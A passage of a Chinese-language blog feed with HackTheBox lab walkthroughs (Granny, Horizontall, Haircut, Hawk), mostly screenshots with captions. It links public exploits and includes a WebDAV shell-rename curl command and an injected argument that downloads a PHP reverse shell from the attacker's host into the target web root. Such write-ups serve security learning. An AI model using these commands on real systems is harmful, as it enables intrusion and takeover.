                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.4hs5umabyjc0.webp"
                     
                ></p>
<p>之后利用MOVE将shell文件进行改名</p>
<p><code>curl -X MOVE http://10.10.10.15/test.txt -H &quot;Destination: /test.aspx&quot; -vvvvv</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.3kyeb7gcj380.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.3t8jobf23ma0.webp"
                     
                ></p>
<p>由于这台机子是2003，不具备powershell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.4jam2l7rlgo0.webp"
                     
                ></p>
<p>搜了一下6.0的exp</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.5iqesxhdc1w0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.47xowylkf7s0.webp"
                     
                ></p>
<p>利用这个缓冲区溢出进行获取shell</p>
<p>修改一下IP</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.2p6ce6bxfrc0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.5o0qpsw3j0w0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.51kuf393r1w0.webp"
                     
                ></p>
<p>貌似没作用</p>
<p><code>https://github.com/k4u5h41/CVE-2017-7269/blob/main/ii6_reverse_shell.py</code></p>
<p>利用这个，利用python2执行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.4skwcbwkkvw0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.6ntjcksbvow0.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.6u7g8ep8qwk0.webp"
                     
                ></p>
<p>利用Churrasco.exe进行提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.39zy85ij3je0.webp"
                     
                ></p>
<p><code>https://github.com/rayhan0x01/reverse-shell-able-exploit-pocs/blob/master/ms09-012.md</code></p>
<p>利用ftp上传exp</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.4d6uairoxnc0.webp"
                     
                ></p>
<p>而ftp有一个骚操作，将需要执行的ftp命令事先写入一个文本中，将文本上传到靶机，之后利用<code>ftp -n -v -s:ftp.txt</code>，进行执行，从而达到自动化操作</p>
<p>准备好提权exp和msf生成一个后门shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.4khjk9kbr080.webp"
                     
                ></p>
<p>将ftp.txt文件同样用put方法上传上去</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.1jg6dxv7xby8.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.2gntq9ra8j0g.webp"
                     
                ></p>
<p>然后在本地利用python开启一个ftp服务</p>
<p><code>python3 -m pyftpdlib -p 21</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.2qwh3oba31m0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.6gmrv7gddxs0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.7jr084f6f0o0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.19pclttz9rr4.webp"
                     
                ></p>
<p>然后利用churraskito去执行shell程序</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.2die8atftusk.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.34jt6bui9r60.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.2ebn09zcpcg0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.40e4mdiey6c0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Horizontall - HackTheBox</title>
    <url>/post/e6803fd388f9/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.1mwfsxtmi09s.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.69kxmaxykt80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.5rqgfarbnkk0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.2in7n1rq3s40.webp"
                     
                ></p>
<p>添加域名到hosts文件，访问80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.38ozehra6di0.webp"
                     
                ></p>
<p>扫目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.5swzqjd0kaw0.webp"
                     
                ></p>
<p>看看js文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.1my7lwoj1ohs.webp"
                     
                ></p>
<p>又发现一个域名，添加hosts文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.428laop0fi40.webp"
                     
                ></p>
<p>扫目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.20sc9lu7ygo0.webp"
                     
                ></p>
<p>看看admin</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.1buckc8a6fz4.webp"
                     
                ></p>
<p>登录框，而且给了提示是strapi，搜一下有无exp</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.7ozup67o0t0.webp"
                     
                ></p>
<p>尝试最后一个重置密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.6d1orcl8vwg0.webp"
                     
                ></p>
<p><code>https://github.com/guglia001/CVE-2019-18818/blob/main/CVE-2019-18818.py</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.4878r2ft47w0.webp"
                     
                ></p>
<p>email盲猜是admin@加上域名</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.1vaq1n4g09uo.webp"
                     
                ></p>
<p>成功重置密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.1anbj1y08qe8.webp"
                     
                ></p>
<p>登录后在尝试rce漏洞</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.772bvyjzv5g0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.3gg13e0x2tk0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.47klgx0xd520.webp"
                     
                ></p>
<p>试试反弹shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.26ng41v7kq80.webp"
                     
                ></p>
<p>用base64编码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.795r4pz4j480.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.4auy7csm5yg0.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.3ctrg7xhk880.webp"
                     
                ></p>
<p>发现数据库账号密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.51jd8y71zyc0.webp"
                     
                ></p>
<p>就一个admin，而且密码还是被重置为123456的</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.5qp8iyqce3g0.webp"
                     
                ></p>
<p>这个1337和8000端口不知道是什么服务</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.50p8khlouyc0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.29iqi9c7t6tc.webp"
                     
                ></p>
<p>8000端口发现一个Laravel 服务</p>
<p><code>https://github.com/nth347/CVE-2021-3129_exploit</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.1qkrvwl40peo.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.57hiza99nag0.webp"
                     
                ></p>
<p>正好这边有个exp可利用，但是他端口只要本地开放，要把端口转发过来</p>
<p>用chisel把端口转发到攻击机</p>
<p><code>https://github.com/jpillora/chisel</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.6ykay3nxp9s0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.72hsoqj3aqk0.webp"
                     
                ></p>
<p>访问127.0.0.1:8000</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.3ccxb0rwgrs0.webp"
                     
                ></p>
<p>尝试用Laravel的exp</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.54a4l4l33380.webp"
                     
                ></p>
<p>反弹shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.9ti35w88r44.webp"
                     
                ></p>
<p>还是用base64</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.5nuqhmr2n2w0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.6btdn54nh400.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Haircut - HackTheBox</title>
    <url>/post/d81c24607f5d/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.5i239f4v0j00.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.1iwdwgloqnog.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.5e1n6i676xc0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.737eb61c3080.webp"
                     
                ></p>
<p>访问80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.6g5qmsewtc80.webp"
                     
                ></p>
<p>就一张图片，扫个目录</p>
<p><code>gobuster dir -u &quot;http://10.10.10.24&quot; -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,sh,pl -t 30</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.4fucnl8milc0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.238d8d4ytps0.webp"
                     
                ></p>
<p>有点像ssrf</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.6noer7de6hg.webp"
                     
                ></p>
<p>执行之后还是一张图片，看看能不能反弹shell回来</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.1247lhqx004w.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.5671vo6r8og0.webp"
                     
                ></p>
<p>被过滤了，感觉是curl，应该能重定向文件</p>
<p>准备一个php反弹shell</p>
<p><code>http://10.10.14.13/php-reverse-shell.php -o /var/www/html/test.php</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.17983gkxkuo0.webp"
                     
                ></p>
<p>无权限写，但之前扫目录的时候发现一个uploads目录，往那里写一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.3n1btx6gc920.webp"
                     
                ></p>
<p>好像成功了，访问一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.19i2aqihnvj4.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.qnjqpjh50sw.webp"
                     
                ></p>
<p>又是pkexec，换一种方式吧</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.560gdufq4us0.webp"
                     
                ></p>
<p>screen这个版本有权限提升漏洞</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.5fw0b7fdkcg0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.5hishzkcqfc0.webp"
                     
                ></p>
<p>先创建两个文件，libhax.c，rootshell.c</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.2hw1av9q1j40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.2ukwq901jne0.webp"
                     
                ></p>
<p>让靶机下载编译</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.4xo51bv8sz40.webp"
                     
                ></p>
<p>这个问题好像是gcc版本问题，先编译好再让靶机下载</p>
<p>采用静态编译</p>
<p><code>gcc -fPIC -shared -ldl -o libhax.so libhax.c --static</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.5ol0xbtc3ek0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.6eb9yh80o640.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.2egnscqh27vo.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.1kiz00v8bi2o.webp"
                     
                ></p>
<p>然后依次执行这些命令</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.2rtr7mv58x40.webp"
                     
                ></p>
<p>rootshell文件即会拥有suid权限，执行就会触发rootshell里面的&#x2F;bin&#x2F;bash，达到权限提升</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.2wobz0f67q20.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Haircut/image.3h3gqexe5240.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Hawk - HackTheBox</title>
    <url>/post/4ed2fd6214e3/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.18plvmvgdjr4.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.5h57bwckeec0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.uhsi8j47iu8.webp"
                     
                ></p>
<p>先看看80</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.7g8ktpveojw0.webp"
                     
                ></p>
<p>送分题？</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.w6xrn5arhow.webp"
                     
                ></p>
<p>确定版本</p>
<p><code>https://github.com/pimps/CVE-2018-7600</code></p>
<p>他分为两个利用脚本，一个为7.57，一个是7.58</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.5y6qdr6fvpo0.webp"
                     
                ></p>
<p>7.58的需要一个账号密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.5lkpr1lwsvw0.webp"
                     
                ></p>
<p>但无法注册，试试7.57的</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.39rz3so5zf20.webp"
                     
                ></p>
<p>看下ftp有没有东西</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.3cyhlgwwa820.webp"
                     
                ></p>
<p>下载下来</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.6l9v89um9r80.webp"
                     
                ></p>
<p>这是个啥玩意</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.659gj540a680.webp"
                     
                ></p>
<p>openssl加密还经过base64编码，先解base64</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.66nvf4n1sv40.webp"
                     
                ></p>
<p>把这些保存到另一个文本中</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.62dkva0p7os0.webp"
                     
                ></p>
<p>然后就是爆破了</p>
<p><code>https://manpages.debian.org/testing/bruteforce-salted-openssl/bruteforce-salted-openssl.1.en.html</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.3x4yf90155i0.webp"
                     
                ></p>
<p>先下载下来</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.1w8asfiwe45c.webp"
                     
                ></p>
<p><code>bruteforce-salted-openssl -f /usr/share/wordlists/rockyou.txt ssl</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.33oavc5t4jm0.webp"
                     
                ></p>
<p>他说他没找着密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.7ajoanukz9c0.webp"
                     
                ></p>
<p>默认采用md5，给他改个sha256试试</p>
<p><code>bruteforce-salted-openssl -f /usr/share/wordlists/rockyou.txt ssl -d sha256</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.7i0rz0itai80.webp"
                     
                ></p>
<p>有了，解密文件</p>
<p><code>openssl aes-256-cbc -d -in ssl -out ssl.txt</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.7bzd9kjxzyw0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.1mo61r6enoao.webp"
                     
                ></p>
<p>尝试登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.7j6fdrp1xk80.webp"
                     
                ></p>
<p>这下就可以用7.58的工具</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.es46ivna3js.webp"
                     
                ></p>
<p>反弹个shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.498gnehsed00.webp"
                     
                ></p>
<p>我在这试了半年，结果不行，去网站后台开启PHP解析后，写一个php webshell，在用burp抓包进行url编码才反弹成功</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.49pzlv7e5ve0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.7279ejcdun40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.13hcek4s6t6o.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.5sau6fnpuls0.webp"
                     
                ></p>
<p>扫描发现数据库账号密码，尝试登录mysql</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.6we4ga1qek00.webp"
                     
                ></p>
<p>但是上不去，一直卡在这</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.ctimmcn7ko8.webp"
                     
                ></p>
<p>这里还有一个用户，尝试切换过去</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.w6chzizykyo.webp"
                     
                ></p>
<p>这貌似是给了一个python的终端，切换成shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.mp2jzcan54w.webp"
                     
                ></p>
<p>继续提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.5nbxg8w5cus0.webp"
                     
                ></p>
<p>在8082端口上运行的H2 databases是由root权限启动的</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.2fuz4qcxxqzo.webp"
                     
                ></p>
<p>不允许外部访问</p>
<p><code>https://www.exploit-db.com/exploits/45506</code></p>
